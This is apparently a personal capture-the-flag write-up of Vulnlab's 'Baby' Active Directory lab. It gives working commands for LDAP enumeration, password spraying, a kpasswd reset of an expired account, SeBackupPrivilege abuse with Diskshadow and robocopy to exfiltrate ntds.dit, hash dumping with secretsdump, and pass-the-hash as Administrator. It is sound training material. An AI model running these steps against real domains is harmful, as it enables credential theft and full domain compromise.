+++
date = '2026-07-07T12:35:35+02:00'
draft = false
title = 'Baby Writeup EN'
+++
**Name**: **`joy.scd01`**

**Date**: **`12/06/2025`**

![baby-slide.png](/images/imgs_baby/baby-slide.png)

---
# Introduction

**_Baby_** is an **Easy-level Active Directory** environment from **Vulnlab** that focuses on core AD enumeration and the exploitation of common misconfigurations.

The initial foothold requires enumerating **LDAP** to gather a user list and a default password, followed by a **password spraying** attack. Finding an account with an expired password, I leveraged **Kerberos kpasswd** to reset it and gain **WinRM** access. For privilege escalation, I abused the **SeBackupPrivilege** using **Diskshadow and Robocopy** to extract the **`ntds.dit`** database. This allowed me to dump the **Administrator**'s **NTLM hash** and perform a **Pass-The-Hash** attack to fully compromise the domain.

---
# Techniques Used
- **LDAP Enumeration & Password Spraying**

- **Kerberos kpasswd Abuse**

- **SeBackupPrivilege Abuse**

- **`ntds.dit` Extraction & Pass-The-Hash**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- baby
```

![nmap1.png](/images/imgs_baby/nmap1.png)

Targeted scan with script and service detection:

```bash
nmap -sC -sV -Pn baby
```

![nmap2.png](/images/imgs_baby/nmap2.png)

**Open Ports**:
- **53**/tcp - DNS

- **88**/tcp - Kerberos

- **135**/tcp - MSRPC

- **139**/tcp - netbios-ssn

- **389**/tcp - LDAP

- **445**/tcp - microsoft-ds (SMB)

- **464**/tcp - kpasswd5

- **3268**/tcp - LDAP Global Catalog

- **3389**/tcp - RDP

- **5985**/tcp - WinRM

## SMB & LDAP Enumeration

I started by checking for anonymous access on **SMB** using **NetExec**, but it was disabled.

```bash
nxc smb 10.10.102.118 -u '' -p '' --shares
nxc smb 10.10.102.118 -u '' -p '' --users
```

![smbenum.png](/images/imgs_baby/smbenum.png)

Since **SMB** didn't yield results, I moved to **LDAP** anonymous enumeration.

```bash
nxc ldap 10.10.102.118 -u '' -p '' --users
```

![ldapenum.png](/images/imgs_baby/ldapenum.png)

This was highly successful. I was able to retrieve a list of domain users, which I saved into a file named **`users.txt`**:

```text
Jaqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson 
```

More importantly, during the **LDAP** enumeration, a default password was discovered in the user attributes:

```text
BabyStart123!
```

---
# Initial Access | Password Spraying → kpasswd reset

Armed with a valid user list and a potential default password, I performed a **password spraying** attack against the **SMB** service.

```bash
nxc smb 10.10.102.118 -u users.txt -p 'BabyStart123!'
```

![spraying.png](/images/imgs_baby/spraying.png)

The spray revealed that the user **Caroline.Robinson** was using this password, but her account had the "**Password Expired**" flag set.

**Note**: _Normally, this would prevent a standard **WinRM** or **SMB** login. However, **Kerberos** provides a built-in mechanism to change expired passwords via the **kpasswd** utility (**port 464**)._

To use **kpasswd**, I first needed to configure my attacker machine to communicate with the target's **Kerberos Key Distribution Center** (**KDC**). 

I modified my **`/etc/krb5.conf`** file:

```text
[libdefaults]
        default_realm = BABY.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
[realms]
        BABY.VL = {
                kdc = BABYDC.BABY.VL
                admin_server = BABYDC.BABY.VL          
        }
```

With the realm configured, I requested a password change for the expired account:

```bash
kpasswd Caroline.Robinson
```

![kpass.png](/images/imgs_baby/kpass.png)

After successfully setting a new password, I connected to the machine using **Evil-WinRM**:

![carolinaproof.png](/images/imgs_baby/carolinaproof.png)

I navigated to the desktop and grabbed the **user flag**.

---
# Privilege Escalation | SeBackupPrivilege abuse

Once inside the system, I began my standard local enumeration by checking my current user's privileges.

```powershell
whoami /priv
```

![whoamipriv.png](/images/imgs_baby/whoamipriv.png)

I immediately noticed that **`SeBackupPrivilege`** was enabled.

**Note**: _**`SeBackupPrivilege`** was designed to allow backup software to read all files on a system, bypassing standard **NTFS Read/Write permissions**. An attacker can abuse this privilege to extract sensitive files that are normally locked or inaccessible, such as the **`ntds.dit`** **Active Directory** database and the **SYSTEM** registry hive._

To exploit this, according to this guide:

- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960

(Following **Method 1**)

I used the **Diskshadow** utility to create a **Volume Shadow Copy** of the **`C:`** drive, which allows copying files that are currently in use by the operating system.

I created a malicious script named **`backup.txt`** on my attacker machine:

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

I uploaded it to the target machine via the **Evil-WinRM** upload feature:

```bash
upload backup.txt
```

I then executed **Diskshadow** using the uploaded script:

```powershell
diskshadow /s backup.txt
```

With the **`C:`** drive successfully exposed as the **`E:`** drive, I used **Robocopy** (in backup mode /b) to extract the **`ntds.dit`** file:

```powershell
robocopy /b E:\Windows\ntds . ntds.dit
```

Next, I needed the **SYSTEM** registry hive to extract the boot key required to decrypt the **`ntds.dit`** database:

```powershell
reg save hklm/system system.bak
```

I downloaded both **`ntds.dit`** and **`system.bak`** back to my attacker machine:

```powershell
download ntds.dit 
download system.bak
```

## Dumping Hashes & Domain Compromise

Back on my local machine, I set up a **Python virtual environment** and installed **Impacket** to parse the database.

```bash
python3 -m venv venv 
source venv/bin/activate
pip3 install impacket
```

I used **Impacket**'s **`secretsdump.py`** to extract all the **NTLM hashes** from the dumped files:

```bash
secretsdump.py -ntds ntds.dit -system system.bak -hashes lmhash:nthash LOCAL
```

The extraction yielded the NTLM hash for the Administrator account:

```text
ee<REDACTED>3d
```

Using this hash, I performed a **Pass-The-Hash** attack to establish a highly privileged **WinRM** session:

```bash
evil-winrm -i baby.vl -u Administrator -H ee<REDACTED>3d
```

navigated to the **Administrator**'s desktop and retrieved the **root flag**.

**Note**: _For long-term access, a standard **Red Team** persistence technique involves creating a new local user and adding it to the **Administrators** group, or setting up a **scheduled task** triggering a reverse shell on reboot. No persistent changes were left on this lab._

---
# Final Thoughts

**_Baby_** is a great introductory machine to **Active Directory** environments.

It perfectly highlights a very common real-world scenario: administrators setting default passwords and relying on the "**Password Expired**" flag as a security measure, completely forgetting about **Kerberos kpasswd** capabilities.

The privilege escalation path highlights a classic **Low-Hanging Fruit** in **Active Directory** environments, approached here with a standard **Red Team** methodology. Manually exploiting **`SeBackupPrivilege`** using native Windows binaries like **diskshadow and robocopy** (Living off the Land techniques) is an essential skill to master for evading basic detection, especially when preparing for practical certifications like the **OSCP**.

**Resources**:

- **Windows PrivEsc with SeBackupPrivilege (R3d Buck3t) | https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960**